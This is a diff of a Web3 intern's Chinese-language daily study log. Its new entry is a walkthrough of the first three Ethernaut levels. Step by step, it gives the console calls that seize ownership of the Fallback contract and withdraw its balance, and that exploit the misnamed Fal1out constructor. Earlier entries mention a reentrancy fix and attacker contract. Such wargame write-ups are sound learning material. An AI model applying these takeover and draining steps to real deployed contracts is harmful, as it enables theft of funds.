@@ -15,8 +15,183 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-01-22
+<!-- DAILY_CHECKIN_2026-01-22_START -->
+## 今天完成了入门技术中的任务，针对ethernaut前三关做了一份攻略
+
+### level 0：**Hello Ethernaut**（教学关）
+
+-   **查看第一条线索**
+    
+
+```
+await contract.info()
+```
+
+它会告诉你调用info1（）。
+
+-   **跟随线索**
+    
+
+```
+await contract.info1()
+```
+
+它会告诉你尝试调用 info2()，但需要传一个字符串 "hello" 作为参数。
+
+-   **继续调用**
+    
+
+```
+await contract.info2("hello")
+```
+
+它会提到 infoNum 这个属性。
+
+-   **查看属性值**
+    
+
+```
+await contract.infoNum()
+```
+
+返回一个数字（通常是 42），提示你去调用对应的 info\[数字\]。
+
+-   **调用对应编号的方法**
+    
+
+```
+await contract.info42()
+```
+
+它会告诉你 theMethodName 是下一个方法的名称。
+
+-   **获取真正的方法名**
+    
+
+```
+await contract.theMethodName()
+```
+
+这会返回一个字符串，比如 'method7123949'。
+
+-   **调用这个奇怪的方法**
+    
+
+```
+await contract.method7123949() // 注意使用上一步返回的实际名称
+```
+
+它会告诉你：如果你知道密码（password），就调用 authenticate()。
+
+-   **寻找密码**
+    
+
+```
+await contract.password()
+```
+
+它会返回一个字符串（例如 "ethernaut0"）。
+
+-   **最后一步：认证**
+    
+
+```
+await contract.authenticate("ethernaut0")
+```
+
+此时 MetaMask 会再次弹出，要求你支付一笔交易。确认后等待交易上链。
+
+### 回到网页底部，点击 **"Submit Instance"**。如果一切顺利，你会看到通关成功的提示。
+
+### level 1：**Fallback**
+
+这一关的目标是：
+
+1.  获得合约的**所有权 (owner)**。
+    
+2.  将合约里的 **余额 (balance) 清零**。
+    
+
+### 核心原理（漏洞所在）
+
+观察合约代码，你会发现 receive() 函数（或者是旧版本的 fallback()）有一个逻辑漏洞：
+
+```
+receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+}
+```
+
+这意味着：如果你曾经给合约贡献过一点点钱（contributions > 0），并且你现在直接往合约地址发送一笔钱（触发 receive），你就能直接变成 owner。
+
+-   **进行一次小额贡献**
+    
+
+```
+await contract.contribute({value: toWei('0.0001')})
+```
+
+点击 MetaMask 确认交易，等待完成。
+
+-   **夺取所有权**
+    
+
+```
+await contract.sendTransaction({value: toWei('0.0001')})
+```
+
+点击 MetaMask 确认交易。
+
+-   **验证是否成为 Owner**
+    
+
+```
+await contract.owner()
+```
+
+确认返回的是否是自己的地址
+
+-   **提出所有的钱**
+    
+
+```
+await contract.withdraw()
+```
+
+再次确认交易。
+
+### 回到网页底部，点击 **"Submit Instance"**。
+
+### level 2：**Fallout**
+
+### 核心漏洞原理：
+
+在早期的 Solidity 版本（0.5.0 之前）中，合约的**构造函数**（Constructor，即在部署时运行一次的函数）必须与**合约名完全一致**。而本文中function Fal1out()（注意中间那个是**数字 1**，而不是字母 **l**），这就导致Fal1out() 并没有变成构造函数，而是变成了一个**普通的、任何人都可以随时调用的公开函数**。由于这个函数的内容是 owner = msg.sender，所以任何人只要调用它，就能瞬间成为合约的主人。
+
+-   **调用那个“写错”的函数**
+    
+
+```
+await contract.Fal1out()
+```
+
+matamask确认这笔交易。这笔交易会将合约的 owner 修改为自己的钱包地址。
+
+-   **检查是否成为了 Owner（可选）**
+    
+
+```
+await contract.owner()
+```
+
+### 回到网页底部，点击 **"Submit Instance"**。
+<!-- DAILY_CHECKIN_2026-01-22_END -->
+
 # 2026-01-21
 <!-- DAILY_CHECKIN_2026-01-21_START -->
+
 ## 今天首先完成了漏洞修复案例任务，完成了重入攻击漏洞修复，并编写了attack代码验证结果。
 
 ### 有漏洞代码，先转账再更新状态：
@@ -148,6 +323,7 @@ contract Attacker {
 # 2026-01-20
 <!-- DAILY_CHECKIN_2026-01-20_START -->
 
+
 ## 今天最重要的就是听了有关web3公共物品资金分配的分享会，受益良多，总结了一些内容。
 
 **在经济学中，公共物品具有两个核心特征：**
@@ -193,11 +369,13 @@ contract Attacker {
 <!-- DAILY_CHECKIN_2026-01-19_START -->
 
 
+
 ## 今天主要**完成挑战 Challenge #0 - Tokenization和通过了 Ethernaut 前 3 关，对nft有了更深的理解**
 <!-- DAILY_CHECKIN_2026-01-19_END -->
 
 # 2026-01-18
 <!-- DAILY_CHECKIN_2026-01-18_START -->
+
 
 
 
@@ -252,11 +430,13 @@ contract Attacker {
 
 
 
+
 # 今天虽然没看什么，但是还是坚持打卡
 <!-- DAILY_CHECKIN_2026-01-17_END -->
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -344,11 +524,13 @@ Solidity 采用“全有或全无”机制：
 
 
 
+
 ## 今天主要听了rick老师的智能体AI与web3融合的分享会。
 <!-- DAILY_CHECKIN_2026-01-15_END -->
 
 # 2026-01-14
 <!-- DAILY_CHECKIN_2026-01-14_START -->
+
 
 
 
@@ -402,6 +584,7 @@ Solidity 采用“全有或全无”机制：
 
 
 
+
 ## 今天主要阅读了021 学习以太坊第 2&3 章，了解了web3领域中合规与网络安全相关的内容。
 
 ## 以及铸造了第一个NFT
@@ -411,6 +594,7 @@ Solidity 采用“全有或全无”机制：
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
